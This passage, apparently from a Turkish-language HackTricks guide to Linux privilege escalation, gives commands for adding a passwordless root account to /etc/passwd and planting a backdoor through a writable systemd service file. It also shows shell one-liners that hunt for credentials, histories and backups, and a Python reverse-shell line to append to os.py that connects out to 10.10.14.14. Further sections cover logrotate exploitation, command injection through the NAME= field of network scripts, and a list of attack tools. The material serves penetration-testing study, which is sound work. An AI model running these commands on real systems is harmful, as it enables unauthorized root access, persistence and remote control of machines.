hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örneğin: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini düşürebilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` olarak bulunur, ayrıca `/etc/shadow` yeniden adlandırılarak `/etc/spwd.db` olmuştur.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **Tomcat servis yapılandırma dosyasını /etc/systemd/ içinde değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatılışında çalıştırılacak.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncuyu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifreler içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; şifre içerebilecek **birkaç olası dosyayı** arar.\
**Bunu yapmak için kullanabileceğiniz başka ilginç bir araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) açık kaynaklı bir uygulamadır; Windows, Linux & Mac için yerel bir bilgisayarda depolanan birçok şifreyi elde etmek için kullanılır.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logları**, bu gönderide açıklandığı gibi audit loglarına **şifre kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak için grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten çok yardımcı olacaktır.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca **adı** veya **içeriği** içinde "**password**" kelimesi geçen dosyaları, log'lar içindeki IP'leri ve e-postaları veya hash'leri (regexps) kontrol etmelisiniz.\
Burada bunların tümünü nasıl yapacağınızı listelemeyeceğim, ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python kütüphanelerini değiştirebiliyorsanız**, os kütüphanesini değiştirip backdoor yerleştirebilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'daki bir zafiyet, bir log dosyası veya üst dizinlerinde **yazma izinleri** olan kullanıcıların ayrıcalık yükseltmesine olanak verebilir. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in kötüye kullanılarak özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaların çalıştırılmasının sağlanabilmesidir. İzinleri sadece _/var/log_ içinde değil, log rotation uygulanan herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve öncekilerini etkiler

Daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) (**nginx logs**) ile çok benzer, bu yüzden günlükleri değiştirebildiğinizi her bulduğunuzda, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlink ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinize bakın.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir sebeple bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scripti **yazabiliyorsa** **veya** mevcut bir scripti **düzenleyebiliyorsa**, sisteminiz pwned olur.

Network scripts, örneğin _ifcg-eth0_, network bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumda, bu network scriptlerindeki `NAME=` ataması doğru şekilde işlenmiyor. Eğer isimde **beyaz/boşluk karakteri varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırılması** anlamına geliyor.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **komut dosyalarının** bulunduğu yerdir; **klasik Linux servis yönetim sistemi** olarak kullanılır. İçinde servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için komut dosyaları bulunur. Bunlar doğrudan çalıştırılabilir veya `/etc/rc?.d/` içinde bulunan sembolik bağlantılar aracılığıyla yürütülebilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'ir.

Öte yandan, `/etc/init` Upstart ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir servis yönetimi olup servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içinde bir uyumluluk katmanı bulunduğundan SysVinit komut dosyaları Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, otomatik bağlama (automount) yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunan modern bir başlatma ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenleyerek sistem yönetimini kolaylaştırır.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel işlevselliğini bir userspace yöneticisine açmak için bir syscall'a hook koyar. Zayıf yönetici doğrulaması (ör. FD-order tabanlı imza kontrolleri veya zayıf parola şemaları) bir yerel uygulamanın yöneticiyi taklit etmesine ve zaten root'lu cihazlarda root'a yükselmesine izin verebilir. Daha fazla bilgi ve exploit detayları için şuraya bakın:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Çekirdek Güvenlik Koruması

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
